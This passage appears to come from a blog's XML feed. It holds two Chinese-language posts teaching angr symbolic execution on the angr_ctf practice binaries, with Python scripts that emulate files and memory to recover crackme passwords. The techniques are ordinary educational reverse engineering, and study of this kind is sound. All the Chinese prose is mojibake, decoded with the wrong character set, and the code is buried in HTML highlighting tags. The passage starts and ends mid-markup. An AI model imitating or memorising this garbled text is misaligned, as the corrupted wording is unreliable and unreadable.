number">0x12345678</span>pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x0ABCC8A4</span>fake_heap_address1 <span class="token operator">=</span> <span class="token number">0x12345680</span>pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x0ABCC8AC</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Êää‰º™ÈÄ†Âú∞ÂùÄÁªô‰∫Ü <code>buffer0</code> Âíå <code>buffer1</code> ‰πãÂêéÔºåÂ§ÑÁêÜËµ∑Êù•Â∞±Âíå Part4 ÁöÑËøáÁ®ã‰∏ÄÊ†∑‰∫Ü„ÄÇÊúÄÂêéÊ±ÇËß£ÂæóÂà∞ÁªìÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501113539990.png" alt="image-20220501113539990"></p><h1 id="Part-6-angr-symbolic-file"><a href="#Part-6-angr-symbolic-file" class="headerlink" title="Part 6 angr symbolic file"></a>Part 6 angr symbolic file</h1><p>07_angr_symbolic_file ‰æãÂ≠êÂèØ‰ª•Áî®‰∫éÂ≠¶‰π†Â¶Ç‰ΩïÊ®°Êãü‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªüÔºåÂΩìÁÑ∂ËøòÂèØ‰ª•Áî®‰πãÂâçÂ≠¶‰π†ËøáÁöÑÊñπÂºèËß£ÂÜ≥ÈóÆÈ¢ò„ÄÇIDA ÂàÜÊûêÊñá‰ª∂Ôºå‰ΩøÁî® <code>fread</code> ÂáΩÊï∞‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÂÜÖÂÆπÔºåÂ§ÑÁêÜÂêéËøõË°åÂØπÊØîÔºåÂ¶ÇÊûúÊ≠£Á°ÆËæìÂá∫‚ÄùGood Job‚ÄùÔºå<code>ignore_me</code> Â∞ÜËæìÂÖ•ÂÜÖÂÆπÂÜôÂÖ•Âà∞Êñá‰ª∂‰∏≠ÔºåÊòØÈúÄË¶ÅÁªïËøáÁöÑÂáΩÊï∞Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502111158805.png" alt="image-20220502111158805"></p><p>Áé∞Âú®Ë¶ÅÂ§ÑÁêÜÁöÑÈóÆÈ¢òÔºö</p><ul><li>Á°ÆÂÆö <code>fread</code> ËØªÂèñÁöÑÊñá‰ª∂</li><li>‰ΩøÁî® angr Ê®°Êãü‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªüÔºåÊõøÊç¢ <code>fread</code> ËØªÂèñÁöÑÊñá‰ª∂‰∏∫Êàë‰ª¨Ëá™Â∑±ÁöÑÊñá‰ª∂</li><li>Áî®Á¨¶Âè∑ÂÄºÂàùÂßãÂåñÊñá‰ª∂ÔºåÁî® <code>fread</code> ËØªÂèñÂπ∂‰º†Êí≠Ê±ÇËß£ÔºåÊúÄÂêéÂæóÂà∞Ê≠£Á°ÆÂØÜÁ†Å</li></ul><p>È¶ñÂÖàÁ°ÆÂÆö <code>start_address</code> „ÄÇÈÄöËøáÂàÜÊûêÔºåÁ®ãÂ∫è‰ªé 0x080488EA ÂºÄÂßãÊâìÂºÄ OJKSQYDP.txt Êñá‰ª∂Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502122135428.png" alt="image-20220502122135428"></p><p>ÁÑ∂ÂêéÊåáÂÆöÊ®°ÊãüÊñá‰ª∂ÊâÄÈúÄÁöÑ‰ø°ÊÅØÔºåÁ®ãÂ∫è‰∏≠ÊâìÂºÄÁöÑÊñá‰ª∂ÂêçÁß∞ÊòØÂõ∫ÂÆöÁöÑÔºåÂèØ‰ª•Áî®Á¨¶Âè∑ÊõøÊç¢Êñá‰ª∂Âêç„ÄÇÁî± <code>%64s</code> ÂèØ‰ª•ÂæóÁü•ÂÜôÂÖ•ÁöÑÊñá‰ª∂Â§ßÂ∞è‰∏∫ 64 Â≠óËäÇÔºå‰ΩÜÂÆûÈôÖÂè™Âæ™ÁéØËØªÂèñ‰∫Ü 8 Â≠óËäÇÔºåÂú®ÂàõÂª∫ÂêëÈáèÁöÑÊó∂ÂÄôÂ∞±ÊòØ 64 ‰Ωç„ÄÇÁÑ∂Âêé‰ΩøÁî® angr ÁöÑ <code>SimFile</code> Ê®°ÂùóÊ®°ÊãüÊñá‰ª∂Á≥ªÁªüÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">filename <span class="token operator">=</span> <span class="token string">'OJKSQYDP.txt'</span>  symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>password <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes<span class="token punctuation">)</span>password_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>  content<span class="token operator">=</span>password<span class="token punctuation">,</span>size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>password_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰πãÂêéÂ∞±ÊòØÊåáÂÆö <code>find</code> Âíå <code>avoid</code>„ÄÇÂÆåÊï¥‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">'./07_angr_symbolic_file'</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x080488D6</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">'OJKSQYDP.txt'</span>  <span class="token comment"># :string</span>  symbolic_file_size_bytes <span class="token operator">=</span> <span class="token number">64</span>  password <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> symbolic_file_size_bytes<span class="token punctuation">)</span>  password_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>  content<span class="token operator">=</span>password<span class="token punctuation">,</span>size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>password_file<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Good Job.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout_output  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Try again.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> stdout_output  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊúÄÂêéÊ±ÇÂæóÂØÜÁ†ÅÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220502122600085.png" alt="image-20220502122600085"></p>]]></content>
      
      
      
        <tags>
            
            <tag> symbolic execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angrÂÖ•Èó®(‰∏Ä)</title>
      <link href="/2022/04/26/angr-ru-men/"/>
      <url>/2022/04/26/angr-ru-men/</url>
      
        <content type="html"><![CDATA[<p>‰πãÂâç‰∏ÄÁõ¥ÊÉ≥Â≠¶‰π†‰∏Ä‰∏ã angr Á¨¶Âè∑ÊâßË°åÔºåÂú® CTF È¢òÁõÆ‰∏≠ËôΩÁÑ∂Êé•Ëß¶ËøáÂæàÂ§öÊ¨°Ôºå‰πüÁî®ËøáÈÇ£‰πà‰∏Ä‰∏§Ê¨°Ôºå‰ΩÜÈÉΩÊòØÁî®ÁöÑÂà´‰∫∫ÁöÑ‰ª£Á†ÅÔºåÂÆåÂÖ®‰∏çÁêÜËß£ÂÖ∂‰∏≠ÁöÑËøêË°åÊú∫Âà∂ÔºåËÑöÊú¨‰πüÊòØ‰∏çÁü•ÂÖ∂‰πâÔºåËøòÂüãÊÄ® angr ‰∏çÂ•ΩÁî®„ÄÇÂú®ÈáçÊñ∞ËØª‰∫Ü‰∏ÄÈÅçÂÆòÊñπÊñáÊ°£ÂêéÊâçÁü•ÈÅì angr ÂÖ∂ÂÆûÂæàÂº∫Â§ßÔºåÂèØ‰ª•Âè™ÊâßË°åËá™Â∑±ÊÉ≥Ë¶ÅÊâßË°åÁöÑÂáΩÊï∞ËÄå‰∏çÁî®ÊâßË°åÊï¥‰∏™Á®ãÂ∫è„ÄÇÊ≠£Â•ΩÊúÄËøëÁúãÂà∞‰∏Ä‰∏™ÂºÄÊ∫êÈ°πÁõÆÁî®‰∫éÁªÉ‰π† angrÔºåÈÇ£Â∞±‰ªé0ÂºÄÂßãÂΩªÂ∫ïÊää angr Â≠¶‰π†‰∏Ä‰∏ãÔºåÂØπ Fuzz Â∑•‰Ωú‰πüÊòØÂæàÊúâÂ∏ÆÂä©ÁöÑ„ÄÇ</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>È¶ñÂÖà‰ªãÁªç‰∏Ä‰∏ã angr Âêß„ÄÇÂÆÉÊòØ‰∏Ä‰∏™Áî®‰∫é‰∫åËøõÂà∂Êñá‰ª∂ÂàÜÊûêÁöÑ Python Ê°ÜÊû∂ÔºåÁªìÂêà‰∫ÜÈùôÊÄÅÂàÜÊûêÂíåÂä®ÊÄÅÁ¨¶Âè∑ÁöÑÂàÜÊûê„ÄÇangr Â≠¶‰π†ÁöÑË∑ØÁ∫øÊØîËæÉÈô°Â≥≠Ôºå‰∏çÊòØËØ¥ÂÆÉÊúâÂ§öÈöæÔºåËÄåÊòØÊ≤°ÊúâÂêàÈÄÇÁöÑÂ≠¶‰π†ËµÑÊñôÂíåËøûË¥ØÁöÑÂ≠¶‰π†Ë∑ØÂæÑ„ÄÇËøôÈáåÊàëÊâæÂà∞‰∫Ü‰∏Ä‰∏™ÂºÄÊ∫êÈ°πÁõÆ <a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>ÔºåÂÆÉ‰ªé0ÂºÄÂßã‰∏ÄÊ≠•‰∏ÄÊ≠•ÊïôÊàë‰ª¨‰ΩøÁî® angr ÁöÑÂäüËÉΩ„ÄÇ</p><p>Á¨¶Âè∑ÊâßË°åÁöÑÊÑè‰πâÂ∞±ÊòØÂú®‰∏çÂÆûÈôÖËøêË°åÁ®ãÂ∫èÁöÑÊÉÖÂÜµ‰∏ãÂØπÁ®ãÂ∫èËøõË°åÂàÜÊûêÔºå‰ª•‰∫ÜËß£Âú®‰ªÄ‰πàÁä∂ÊÄÅ‰∏ãÔºåÊâßË°å‰∫ÜÂì™Êù°Ë∑ØÂæÑÁöÑ‰ª£Á†Å„ÄÇ‰∏æ‰∏Ä‰∏™ÊúÄÂ∏∏ËßÅÁöÑ‰æãÂ≠êÔºåCTF ‰∏≠ÁöÑÈÄÜÂêëÈ¢òÁõÆÔºåÈÄöÂ∏∏ÊòØÁü•ÈÅìÁ®ãÂ∫èÁöÑËæìÂá∫ÁªìÊûúÔºåË¶ÅÊàë‰ª¨ÂéªÈÄÜÂêëÂä†ÂØÜÁÆóÊ≥ïÔºåÂæóÂà∞Êàë‰ª¨Â∫îËØ•ËæìÂÖ•ÁöÑÊ≠£Á°ÆÂÜÖÂÆπÔºå‰πüÂ∞±ÊòØ flag„ÄÇ</p><p>Á¨¶Âè∑ÊâßË°åÂ∞±ÂÖÅËÆ∏Êàë‰ª¨ÊääÁ®ãÂ∫èÂΩì‰Ωú‰∏Ä‰∏™ÊñπÁ®ãÊù•Ê±ÇËß£ÔºåÂ∞±ÂÉèÊòØÊñπÁ®ãÂºè‰∏≠ÁöÑ X„ÄÅY Á≠âÁ¨¶Âè∑ÔºåËÄåÁ®ãÂ∫èÊâßË°åÁöÑË∑ØÂæÑÁî®‰∫é‚ÄúÁ∫¶Êùü‚ÄùÁ¨¶Âè∑„ÄÇ‰∏æ‰∏™‰æãÂ≠êÔºö</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Fail."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®‰∏äÈù¢ÁöÑ‰ª£Á†ÅÈáåÔºå<code>if</code> ËØ≠Âè•‰∫ßÁîü‰∏§Êù°Ë∑ØÂæÑÔºåË¶Å‰πàÊâìÂç∞‚ÄùSuccess!!‚ÄùÔºåË¶Å‰πàÊâìÂç∞‚ÄùFail‚ÄùÔºåÂÖ∂ÂÆûÂ∞±ÊòØ <code>if</code> ËØ≠Âè•ÂØπÁ¨¶Âè∑ <code>x</code> ÁöÑÁ∫¶Êùü„ÄÇÂÅáËÆæÁé∞Âú®Êàë‰ª¨ÂØπ ‚ÄúSuccess!!‚ÄùËøôÊù°Ë∑ØÂæÑÊØîËæÉÊÑüÂÖ¥Ë∂£ÔºåÈÇ£‰πàÂ∞±ÂøÖÈ°ªÊª°Ë∂≥ <code>1 &lt; x &lt; 10</code>ÔºåËøô‰∏™ÂÖ¨ÂºèÂ∞±ÊòØÁ¨¶Âè∑ÊâßË°å‰∏≠ÁöÑÁ∫¶ÊùüÔºåÁ¨¶Âè∑ÊâßË°åÂºïÊìéÂ∞ÜÊ≠§ËØ≠Âè•Ê≥®ÂÖ•‰∏Ä‰∏™Á¨¶Âè∑Ê†áËØÜÔºåÁªßÁª≠ÂêëÂêéËøêË°å‰ª•ÊâæÂà∞Á¨¶ÂêàÁ∫¶ÊùüÁöÑÂÄº„ÄÇ</p><p>‰∏äÈù¢ÁöÑÁ®ãÂ∫èÊØîËæÉÁÆÄÂçïÔºåÂõ†‰∏∫ÂÆÉÂè™Êúâ‰∏§Êù°Ë∑ØÂæÑÔºåÂæàÂÆπÊòìÂ∞±ÂèØ‰ª•Ê±ÇËß£„ÄÇÂΩìÈÅáÂà∞ÁâπÂà´Â§ßÁöÑÁ®ãÂ∫èÊó∂‰ºöÊúâÂæàÂ§öË∑ØÂæÑÔºåÊ≠§Êó∂Â∞±‰ºöÈÅáÂà∞‚ÄúË∑ØÂæÑÁàÜÁÇ∏‚ÄùÁöÑÈóÆÈ¢òÔºåÂõ†‰∏∫ÊØèÊù°Ë∑ØÂæÑÂêë‰∏ãÊâßË°åÊó∂ÔºåË∑ØÂæÑÈÉΩÊòØÂëàÊåáÊï∞Â¢ûÈïøÁöÑÔºåÁõ∏ÂØπ‰∫éÊ±ÇËß£ÁöÑÊó∂Èó¥Â∞±ÊØîËæÉÈïø‰∫ÜÔºåÂèØËÉΩÂà∞ <a href="https://zh.wikipedia.org/wiki/%E7%83%AD%E5%AF%82">ÁÉ≠ÂØÇ</a> ÈÉΩÊó†Ê≥ïÊ±ÇËß£Âá∫Êù•„ÄÇ</p><h1 id="Part-0-angr-find"><a href="#Part-0-angr-find" class="headerlink" title="Part 0 angr find"></a>Part 0 angr find</h1><p>ËøõÂÖ•Ê≠£È¢òÔºåÈ¶ñÂÖàÊää angr_ctf ÂÖãÈöÜ‰∏ãÊù•ÔºåËøõÂÖ•Âà∞ dist&#x2F; Êñá‰ª∂Â§π‰∏ãÔºåËøôÈáåÂèØ‰ª•ÊâæÂà∞ËÆ∏Â§öÁªÉ‰π†È¢òÁõÆÂíå‰∏ÄÂ†Ü xx.py ÁöÑÊñá‰ª∂„ÄÇÊâæÂà∞ 00_angr_find ÁöÑÊñá‰ª∂ÔºåËøôÊòØÁ¨¨‰∏Ä‰∏™È¢òÁõÆÔºåÈÄªËæëÁõ∏ÂΩìÁÆÄÂçïÔºåË¶ÅÊ±ÇËæìÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÁ®ãÂ∫èÂØπÂ≠óÁ¨¶‰∏≤ËøõË°åÂ§ÑÁêÜÂêéË¶ÅÂíå‚ÄúJACEJGCS‚ÄùÁõ∏ÂêåÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426233408003.png" alt="image-20220426233408003"></p><p>ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÈúÄË¶ÅÂØπ <code>complex_function</code> ÂáΩÊï∞ËøõË°åÊâãÂä®ÈÄÜÂêëÔºåÁé∞Âú®Áõ¥Êé•Áî® angr Á∫¶ÊùüÊ±ÇËß£ÔºåÂæóÂà∞Â∫îËØ•ËæìÂÖ•ÁöÑÊ≠£Á°ÆÂ≠óÁ¨¶‰∏≤„ÄÇÊé•‰∏ãÊù•Êü•ÁúãËß£È¢ò‰ª£Á†Å scaffold00.py Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> ???  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    print_good_address <span class="token operator">=</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Áé∞Âú®ÈÄêË°åÂàÜÊûêÔºåÈ¶ñÂÖàÂØºÂÖ•‰∫Ü angr Â∫ìÂíå sys Â∫ìÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéÁúã <code>main</code> ÂáΩÊï∞ÁöÑÂÜÖÂÆπÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> ???  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>path_to_binary</code> ÊåáÂÆöÂèØÊâßË°åÁ®ãÂ∫èË∑ØÂæÑ</li><li><code>angr.Project()</code> ÂàõÂª∫‰∏Ä‰∏™ <code>Project</code> ÂÆû‰æã</li><li><code>project.factory.entry_state()</code> Âú®Á®ãÂ∫èÂÖ•Âè£ÁÇπÂàõÂª∫Á®ãÂ∫èÁä∂ÊÄÅÔºåÁ±ª‰ºº‰∫é‰∏Ä‰∏™Âø´ÁÖß</li><li><code>project.factory.simgr()</code> ÂëäËØâÁ¨¶Âè∑ÊâßË°åÂºïÊìé‰ªé <code>initial_state</code> Â§ÑÂºÄÂßãÁ¨¶Âè∑ÊâßË°å</li></ul><p>Êé•‰∏ãÊù•ÁöÑ‰∏§Ë°å‰ª£Á†ÅÊòØÂÖ≥ÈîÆÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">print_good_address <span class="token operator">=</span> ???simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p><code>print_good_address</code> ÊòØÊâìÂç∞‚ÄùGood Job‚ÄùÁöÑÂú∞ÂùÄ</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220426235759712.png" alt="image-20220426235759712"></p></li><li><p><code>simulation.explore()</code> ÂëäËØâÁ¨¶Âè∑ÊâßË°åÂºïÊìéÔºåÊàë‰ª¨ÊÉ≥Ë¶ÅÂà∞ËææÁöÑ‰ª£Á†Å‰ΩçÁΩÆ</p></li></ul><p>ÊúÄÂêéÂá†Ë°å‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëã•Á¨¶Âè∑ÊâßË°åÂºïÊìéÊâæÂà∞Ê≠£Á°ÆË∑ØÂæÑÔºåÂ∞ÜËæìÂÖ•Áªô <code>stdin</code>ÔºåÂê¶ÂàôÊäõÂºÇÂ∏∏„ÄÇ</p><p>‰øÆÊîπÊï¥‰Ωì‰ª£Á†ÅÔºåÂæóÂà∞ÂÆåÊï¥‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./00_angr_find"</span> <span class="token comment"># path of the binary program</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  print_good_address <span class="token operator">=</span> <span class="token number">0x8048678</span>  <span class="token comment"># :integer (probably in hexadecimal)</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>print_good_address<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token 